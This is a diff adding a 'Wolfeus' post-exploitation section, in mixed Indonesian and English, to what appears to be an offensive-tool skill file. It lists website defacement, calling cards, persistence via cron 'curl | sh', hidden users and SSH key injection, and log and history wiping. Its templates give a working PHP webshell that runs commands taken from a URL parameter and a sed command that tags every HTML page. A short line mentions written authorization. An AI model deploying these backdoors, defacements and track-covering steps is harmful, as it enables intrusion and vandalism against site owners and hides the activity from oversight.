@@ -120,7 +120,78 @@ cd skills/brutal-schatt/tools && ./install.sh
 
 ---
 
+## WOLFEUS POST-EXPLOTATION MATRIX (defacement / footprint / calling card / backdoor / flag)
+
+> Operator signature: **Wolfeus**. Every post-exploitation artifact carries this tag.
+> Gunakan HANYA pada target dengan written authorization (mode Brutal, Avres confirmed backup).
+
+```
+┌─ DEFACEMENT ────────────────────────────────────┐
+│ □ Index overwrite (index.html / index.php)     │
+│ □ Mass deface (glob all *.html/*.php)          │
+│ □ Comment tag injection di response HTML       │
+│ □ Title rewrite (<title>Wolfeus was here</title>)│
+│ □ Watermark: <!-- Wolfeus // --> di tiap page  │
+│ □ Backup original (index.bak) sebelum overwrite│
+└───────────────────────────────────────────────┘
+
+┌─ DIGITAL FOOTPRINT ────────────────────────────┐
+│ □ Collect server banner (Server / X-Powered-By)│
+│ □ Gather IP, ASN, geo, hosting provider        │
+│ □ Enumerate subdomains (crt.sh, dnsdumpster)  │
+│ □ Snapshot tech stack (whatweb / wappalyzer)  │
+│ □ Log all endpoints ditemukan (full map)       │
+│ □ Screenshot landing + admin (evidence)        │
+└───────────────────────────────────────────────┘
+
+┌─ CALLING CARD ─────────────────────────────────┐
+│ □ Drop wolfeus.txt di webroot (/wolfeus.txt)   │
+│ □ Isi: "Wolfeus was here — [target] [date]"   │
+│ □ Markdown card: WOLFEUS.md di root            │
+│ □ HTML comment signature di tiap response      │
+│ □ robots.txt append: # Wolfeus // [timestamp]  │
+└───────────────────────────────────────────────┘
+
+┌─ BACKDOOR ─────────────────────────────────────┐
+│ □ PHP backdoor: wolfeus.php (?cmd=)            │
+│ □ Webshell minimal (system($_GET['c']))        │
+│ □ Cron persistence (* * * * * curl | sh)       │
+│ □ Hidden user / SSH key inject                │
+│ □ .htaccess bypass (Options +Indexes)          │
+│ □ Log cleanup (touch -r, hist -c)             │
+└───────────────────────────────────────────────┘
+
+┌─ FLAG (CTF / proof-of-pwn) ────────────────────┐
+│ □ Drop flag.txt: FLAG{Wolfeus_[hash]}         │
+│ □ Env var inject: WOLFEUS_FLAG=1              │
+│ □ DB marker: INSERT wolfeus_pwned=1           │
+│ □ Cookie stamp: wolfeus=visited               │
+│ □ Screenshot proof + hash SHA256              │
+└───────────────────────────────────────────────┘
+```
+
+**Wolfeus artifact templates:**
 ```bash
+# Calling card
+echo "Wolfeus was here — $(date -u) — target: $T" > wolfeus.txt
+
+# Flag
+FLAG="FLAG{Wolfeus_$(echo -n "$T$(date -u)" | sha256sum | cut -c1-16)}"
+echo "$FLAG" > flag.txt
+
+# Backdoor (PHP)
+cat > wolfeus.php <<'PHP'
+<?php if(isset($_GET['c'])){system($_GET['c']);} ?>
+PHP
+
+# Deface watermark
+find . -name '*.html' -exec sed -i '1i <!-- Wolfeus // -->' {} +
+```
+
+> SEMUA artifact di-tag **Wolfeus**. Cleanup wajib setelah engagement (mode Brutal: our responsibility).
+
+---
+
 # 1. Install toolchain
 ./tools/install.sh
 
